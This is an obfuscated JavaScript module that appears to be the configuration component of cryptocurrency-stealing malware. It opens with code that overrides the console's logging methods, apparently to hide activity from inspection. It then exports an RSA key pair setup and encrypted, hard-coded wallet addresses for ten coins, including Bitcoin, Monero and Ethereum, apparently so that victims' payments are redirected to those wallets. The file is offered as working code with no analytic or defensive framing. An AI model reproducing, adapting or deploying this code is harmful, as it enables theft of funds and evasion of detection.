var _0x19579d = (function () {
    var _0x4d6217 = true
    return function (_0x11036b, _0xfdf173) {
      var _0x46f934 = _0x4d6217
        ? function () {
            if (_0xfdf173) {
              var _0x3da732 = _0xfdf173.apply(_0x11036b, arguments)
              return (_0xfdf173 = null), _0x3da732
            }
          }
        : function () {}
      return (_0x4d6217 = false), _0x46f934
    }
  })(),
  _0x22c8d4 = _0x19579d(this, function () {
    var _0x4dade6
    try {
      var _0x1208e4 = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x4dade6 = _0x1208e4()
    } catch (_0x40cfe6) {
      _0x4dade6 = window
    }
    var _0x3c4252 = (_0x4dade6.console = _0x4dade6.console || {}),
      _0x55f12a = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (var _0x5879a5 = 0; _0x5879a5 < _0x55f12a.length; _0x5879a5++) {
      var _0x3b022f = _0x19579d.constructor.prototype.bind(_0x19579d),
        _0x3e8dbd = _0x55f12a[_0x5879a5],
        _0x4ea028 = _0x3c4252[_0x3e8dbd] || _0x3b022f
      _0x3b022f['__proto__'] = _0x19579d.bind(_0x19579d)
      _0x3b022f.toString = _0x4ea028.toString.bind(_0x4ea028)
      _0x3c4252[_0x3e8dbd] = _0x3b022f
    }
  })
_0x22c8d4()
module.exports = (_0x403a45) => {
  var _0x4a2c68 = {}
  return (
    (_0x4a2c68.modulusLength = 2048),
    {
      default_padding:
        _0x403a45.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
      default_oaepHash: 'sha256',
      keyPair: _0x403a45.requires.crypto.generateKeyPairSync('rsa', _0x4a2c68),
      btc: _0x403a45.utils.encryption.encryptData(
        'bc1q08fy4km3rrfys0qu7yne24nw2cuqz7ufn83nu6'
      ),
      ltc: _0x403a45.utils.encryption.encryptData(
        'LKr4SV9Zhicbu3GmGknKxyHcuzDisjhcTE'
      ),
      xmr: _0x403a45.utils.encryption.encryptData(
        '43P5XxZFPMyXjDjYU5ZrYY2ASXKXDfb38cKKCRnPaWJfVk8boEhkR52FZfioi76n9tZgvfXkaekpxM4GzsWWeuS61KK5qGg'
      ),
      eth: _0x403a45.utils.encryption.encryptData(
        '0x8D12090e40f89a4D4be2A148A3e64D09Abd9E213'
      ),
      xrp: _0x403a45.utils.encryption.encryptData(
        'rD1kMAqwNY3d4HGDEzQk9yi9SQ87bohN6v'
      ),
      neo: _0x403a45.utils.encryption.encryptData(
        'AeToyzhytTEDouZdZAWfJ1QTFVqDjEvDKU'
      ),
      bch: _0x403a45.utils.encryption.encryptData(
        'qz6ql5jqxuk9enjsse9pxza62j46rw4725hkf88pxq'
      ),
      doge: _0x403a45.utils.encryption.encryptData(
        'DGSeUm9yozvfdza24ENepRy2XnFVtxdvTC'
      ),
      dash: _0x403a45.utils.encryption.encryptData(
        'XdfTVs5AbJuXBJ11JNqh5Gd7SfQhSAt4kX'
      ),
      xlm: _0x403a45.utils.encryption.encryptData(
        'GBJZGUGN3X3GNYAJ62HLITQH3NPLBQ6NB644OX5DDMVAOZBAIXRXV4NM'
      ),
    }
  )
}
